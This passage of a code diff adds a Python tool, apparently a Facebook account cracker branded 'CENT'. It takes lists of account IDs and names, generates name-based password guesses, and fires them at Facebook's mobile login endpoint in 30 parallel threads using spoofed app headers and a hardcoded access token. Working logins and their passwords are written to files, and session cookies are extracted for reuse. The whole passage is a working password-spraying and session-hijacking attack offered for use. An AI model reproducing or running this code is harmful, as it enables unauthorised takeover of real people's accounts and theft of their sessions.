+                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                           cookies = f"sb={ssbb};{ckkk}"
+                    except Exception as e:print(str(e)+' | '+response.text)
+                break
+            elif 'www.mfacebook.com' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'  ')
+                cpacc.append(acc)
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1
+     except Exception as e:time.sleep(10)
+   
+
+
+ 
+    def start2(user):
+      global loop,accounts
+      try:
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97CENT-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
+                if c=='y':
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                cpacc.append(acc)
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1    
+      except Exception as e: time.sleep(10)
+
+    if m=='2':
+        with speed(max_workers=30) as speede:
+             speede.map(start2, accounts)
+    elif m=='1':
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    else:
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    exit()  
+      
+
+
+
+####@-----Random-----@####
+def andom():
+    okacc = []
+    cpacc = []
+    totalpass = []
+    os.system("clear")
+    print(logo)
+    if 'o': 
+        tpp = input(f'{oo("?")}Total Password? : ')
+        totalpass.append('first')
+        totalpass.append('last')
+        if tpp.isnumeric():
+            ex = 'firstlast first123 last123'
+            print(f'{oo("+")}{ex} (ETC)')
+            for x in range(int(tpp)):
+                totalpass.append(input(f'{oo(x+1)}Password : '))
+            pass
+        else:
+            print(f"{oo('!')}Numeric Only")
+            exit()
+    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
+    m=input(f"{oo('!')}Input : ") 
+    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
+    cpok=input(f"{oo('!')}Input : ")
+    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
+    c=input(f"{oo('!')}Input : ")
+    os.system("clear")
+    print(logo) 
+    print('\033[1;93m='*25)
+    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
+    print(f"{oo('-')}Wait As You Can :)")
+    print(f"{oo('•')}/sdcard/CENT-OK.txt")
+    print('\033[1;93m='*25)
+    print()    
+    def start(user):
+     try:
+        global loop,accounts
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:              
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            print(response.text)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
+                if c=='y':
+                    try:
+                           q = json.loads(response.text)
+                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                           cookies = f"sb={ssbb};{ckkk}"
+                    except Exception as e:print(str(e)+' | '+response.text)
+                break
+            elif 'www.facebook.com' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                cpacc.append(acc)
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1
+     except Exception as e:time.sleep(10)
+   
+
+
+
+ 
+    def start2(user):
+      global loop,accounts
+      try:
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
+                if c=='y':
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                cpacc.append(acc)
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1    
+      except Exception as e: time.sleep(10)
+
+      
+    for x in open('.rndm','r').read().splitlines():
+    	accounts.append(x)
+    
+    if   m=='2':
+       with speed(max_workers=30) as speeede:
+             speede.map(start2, accounts)
+    elif m=='1':
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    else:
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    exit()
+
+
+
+
+CENT_Main()
